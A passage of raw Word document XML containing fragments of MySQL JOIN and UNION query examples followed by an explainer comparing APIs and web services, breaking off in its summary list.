          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>JOIN</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="pln"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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SELECT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FROM</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="pln"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t xml:space="preserve">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lastRenderedPageBreak/>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kwd"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="00008B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>SELECT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23</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bah</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foo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JOIN</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="pln"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t xml:space="preserve">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kwd"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="00008B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>SELECT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45</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bah</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AS</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="pln"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t xml:space="preserve"> bar</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-&gt;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ON</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lit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>33</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lit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>33</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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="pln"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>bah</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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bah </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proofErr w:type="gramStart"/>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23</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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lit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>45</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pln"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D6FC0" w:rsidRPr="00584E67" w:rsidRDefault="007D6FC0" w:rsidP="007D6FC0">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        <w:rPr>
          <w:rStyle w:val="pln"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
      </w:pP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com"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="80808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un"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="lit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>1</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row</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in</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kwd"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="00008B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="pln"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="pun"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="lit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>0.01</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="pln"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t xml:space="preserve"> sec</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="pun"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D6FC0" w:rsidRPr="00584E67" w:rsidRDefault="007D6FC0" w:rsidP="007D6FC0">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        <w:rPr>
          <w:rStyle w:val="pun"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="007D6FC0" w:rsidRPr="00584E67" w:rsidRDefault="007D6FC0" w:rsidP="007D6FC0">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="393318"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pP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SELECT id, name, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>email</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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FROM suppliers</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UNION</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SELECT rep_id, name, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>email</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </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FROM salespeople</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UNION</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SELECT id, name, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>email</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>_address</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D6FC0" w:rsidRPr="00584E67" w:rsidRDefault="007D6FC0" w:rsidP="007D6FC0">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:pBdr>
          <w:top w:val="single" w:sz="8" w:space="8" w:color="CCCCCC"/>
          <w:left w:val="single" w:sz="8" w:space="8" w:color="CCCCCC"/>
          <w:bottom w:val="single" w:sz="8" w:space="8" w:color="CCCCCC"/>
          <w:right w:val="single" w:sz="8" w:space="8" w:color="CCCCCC"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F1FF"/>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FROM customers;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00355281" w:rsidRPr="00584E67" w:rsidRDefault="00355281">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pP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rStyle w:val="Strong"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>API vs Web Service</w:t>
      </w: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color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">API and Web service serve as a means of communication. </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>The only difference is that a Web service facilitates interaction between two machines over a network. An API acts as an interface between two different applications so that they can communicate with each other</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">. An API is a method by which the third-party vendors can write programs that interface easily with other programs. </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>A Web service is designed to have an interface that is depicted in a machine-</w:t>
      </w:r>
      <w:r w:rsidR="00902474" w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>process able</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> format usually specified in Web Service Description Language (WSDL). Typically, </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>“HTTP” is the most commonly used</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId26" w:tooltip="DIFFERENCE BETWEEN VARIOUS COMPUTER PROTOCOLS" w:history="1">
        <w:r w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="83A7BA"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>protocol</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">for communication. </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Web service also uses SOAP, REST, and XML-RPC as a means of communication. </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>API may use any means of communication to initiate interaction between applications. For example, the</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId27" w:tooltip="CASTE VS CLASS" w:history="1">
        <w:r w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="83A7BA"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>system</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>calls are invoked using interrupts by the</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId28" w:tooltip="LINUX VS UBUNTU" w:history="1">
        <w:r w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="83A7BA"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>Linux</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>kernel API.</w:t>
      </w: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b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>An API exactly defines the methods for one</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId29" w:tooltip="COMPARISONS OF SOFTWARE WITH SIMILAR FUNCTIONS" w:history="1">
        <w:r w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:color w:val="83A7BA"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>software</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>program to interact with the other</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> When this action involves sending</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId30" w:tooltip="WAREHOUSING VS MARTS" w:history="1">
        <w:r w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:color w:val="83A7BA"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>data</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>over a network, Web services come into the picture</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>. An API generally involves calling functions from within a software program.</w:t>
      </w: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color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>In case of Web applications, the API used is web based. Desktop applications such as spreadsheets and word documents use VBA and COM-based APIs which don’t involve Web service. A</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId31" w:tooltip="APPLICATION VS WEB" w:history="1">
        <w:r w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="83A7BA"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>server</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>application such as Joomla may use a PHP-based API present within the server which doesn’t require Web service.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00355281" w:rsidRPr="00584E67" w:rsidRDefault="00355281" w:rsidP="00355281">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="263" w:beforeAutospacing="0" w:after="263" w:afterAutospacing="0" w:line="562" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>A Web service is merely an API wrapped in HTTP. An API doesn’t always need to be web based. An API consists of a complete set of rules and specifications for a software program to follow in order to facilitate interaction. A Web service might not contain a complete set of specifications and sometimes might not be able to perform all the tasks that may be possible from a complete API.</w:t>
      </w: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color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>The APIs can be exposed in a number of ways which include: COM objects, DLL and .H files in C/C++ programming language, JAR files or RMI in Java,</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId32" w:tooltip="xml vs xsd" w:history="1">
        <w:r w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="83A7BA"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>XML</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>over HTTP, JSON over HTTP, etc. The method used by Web service to expose the API is strictly through a network.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00355281" w:rsidRPr="00584E67" w:rsidRDefault="00355281" w:rsidP="00355281">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="263" w:beforeAutospacing="0" w:after="263" w:afterAutospacing="0" w:line="562" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Summary:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00355281" w:rsidRPr="00584E67" w:rsidRDefault="00355281" w:rsidP="00355281">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="263" w:beforeAutospacing="0" w:after="263" w:afterAutospacing="0" w:line="562" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1. All Web services are APIs but all APIs are not Web services.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00355281" w:rsidRPr="00584E67" w:rsidRDefault="00355281" w:rsidP="00355281">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="562" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>2. Web services might not perform all the operations that an API</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
